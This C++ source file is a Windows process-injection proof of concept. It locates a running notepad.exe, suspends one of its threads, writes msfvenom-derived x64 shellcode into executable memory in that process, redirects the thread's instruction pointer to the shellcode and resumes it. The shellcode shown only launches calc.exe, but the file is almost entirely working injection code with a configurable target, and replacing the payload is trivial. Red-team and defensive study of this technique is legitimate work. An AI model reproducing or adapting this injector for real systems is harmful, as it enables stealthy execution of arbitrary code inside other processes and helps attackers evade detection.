#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

// ======================================================================
// Reliable x64 shellcode to spawn calc.exe (position-independent, EXITFUNC=thread)
// Source: common msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
// ======================================================================
unsigned char shellcode[] = {
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x40\x66\x2d\xb4\xc6\x71\x2e\xa0\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbc\x2e\xae"
"\x50\x36\x99\xee\xa0\x40\x66\x6c\xe5\x87\x21\x7c\xf1\x16"
"\x2e\x1c\x66\xa3\x39\xa5\xf2\x20\x2e\xa6\xe6\xde\x39\xa5"
"\xf2\x60\x2e\xa6\xc6\x96\x39\x21\x17\x0a\x2c\x60\x85\x0f"
"\x39\x1f\x60\xec\x5a\x4c\xc8\xc4\x5d\x0e\xe1\x81\xaf\x20"
"\xf5\xc7\xb0\xcc\x4d\x12\x27\x7c\xfc\x4d\x23\x0e\x2b\x02"
"\x5a\x65\xb5\x16\xfa\xae\x28\x40\x66\x2d\xfc\x43\xb1\x5a"
"\xc7\x08\x67\xfd\xe4\x4d\x39\x36\xe4\xcb\x26\x0d\xfd\xc7"
"\xa1\xcd\xf6\x08\x99\xe4\xf5\x4d\x45\xa6\xe8\x41\xb0\x60"
"\x85\x0f\x39\x1f\x60\xec\x27\xec\x7d\xcb\x30\x2f\x61\x78"
"\x86\x58\x45\x8a\x72\x62\x84\x48\x23\x14\x65\xb3\xa9\x76"
"\xe4\xcb\x26\x09\xfd\xc7\xa1\x48\xe1\xcb\x6a\x65\xf0\x4d"
"\x31\x32\xe9\x41\xb6\x6c\x3f\xc2\xf9\x66\xa1\x90\x27\x75"
"\xf5\x9e\x2f\x77\xfa\x01\x3e\x6c\xed\x87\x2b\x66\x23\xac"
"\x46\x6c\xe6\x39\x91\x76\xe1\x19\x3c\x65\x3f\xd4\x98\x79"
"\x5f\xbf\x99\x70\xfc\x7c\x70\x2e\xa0\x40\x66\x2d\xb4\xc6"
"\x39\xa3\x2d\x41\x67\x2d\xb4\x87\xcb\x1f\x2b\x2f\xe1\xd2"
"\x61\x7d\x81\x9b\x02\x16\x27\x97\x12\x53\xcc\xb3\x5f\x95"
"\x2e\xae\x70\xee\x4d\x28\xdc\x4a\xe6\xd6\x54\xb3\x74\x95"
"\xe7\x53\x14\x42\xde\xc6\x28\x6f\x29\x9a\x99\xf8\xd7\xa7"
"\x1d\x4d\x8e\x25\x1e\x48\xb4\xc6\x71\x2e\xa0"
};

size_t shellcodeSize = sizeof(shellcode);

// ======================================================================
// Find process ID by name
// ======================================================================
DWORD GetProcessIdByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            if (_wcsicmp(processName.c_str(), pe32.szExeFile) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return pid;
}

// ======================================================================
// Find first thread ID in the process (simplest version)
// ======================================================================
DWORD GetFirstThreadId(DWORD processId) {
    DWORD threadId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te32;
    te32.dwSize = sizeof(te32);

    if (Thread32First(snapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                threadId = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(snapshot, &te32));
    }

    CloseHandle(snapshot);
    return threadId;
}

int main() {
    // ==================================================================
    // CONFIG - CHANGE THESE
    // ==================================================================
    std::wstring targetProcessName = L"notepad.exe";   // Must be running and x64
    // ==================================================================

    std::wcout << L"[*] Looking for target process: " << targetProcessName << L"\n";

    DWORD pid = GetProcessIdByName(targetProcessName);
    if (pid == 0) {
        std::cerr << "[-] Process not found. Launch " << targetProcessName.c_str() << " first.\n";
        return 1;
    }

    std::cout << "[+] Target PID: " << pid << "\n";

    DWORD threadId = GetFirstThreadId(pid);
    if (threadId == 0) {
        std::cerr << "[-] No threads found in target process.\n";
        return 1;
    }

    std::cout << "[+] Hijacking thread ID: " << threadId << "\n";

    // Open process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed: " << GetLastError() << "\n";
        return 1;
    }

    // Open thread
    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, threadId);
    if (!hThread) {
        std::cerr << "[-] OpenThread failed: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return 1;
    }

    // Suspend thread
    if (SuspendThread(hThread) == (DWORD)-1) {
        std::cerr << "[-] SuspendThread failed: " << GetLastError() << "\n";
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // Get thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        std::cerr << "[-] GetThreadContext failed: " << GetLastError() << "\n";
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // Allocate memory in target process
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        std::cerr << "[-] VirtualAllocEx failed: " << GetLastError() << "\n";
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[+] Allocated memory at: 0x" << remoteMem << "\n";

    // Write shellcode
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory failed: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // Hijack RIP (x64)
    ctx.Rip = (DWORD64)remoteMem;

    // Set new context
    if (!SetThreadContext(hThread, &ctx)) {
        std::cerr << "[-] SetThreadContext failed: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[+] Thread context hijacked (RIP -> shellcode)\n";

    // Resume ? execute shellcode ? calc.exe should appear
    if (ResumeThread(hThread) == (DWORD)-1) {
        std::cerr << "[-] ResumeThread failed: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[+] Thread resumed. Waiting for calc.exe to appear...\n";
    std::cout << "[i] If nothing happens: check Event Viewer for crash in target process.\n";

    // Give it time (optional)
    Sleep(8000);

    // Cleanup (memory stays allocated - typical in PoCs)
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
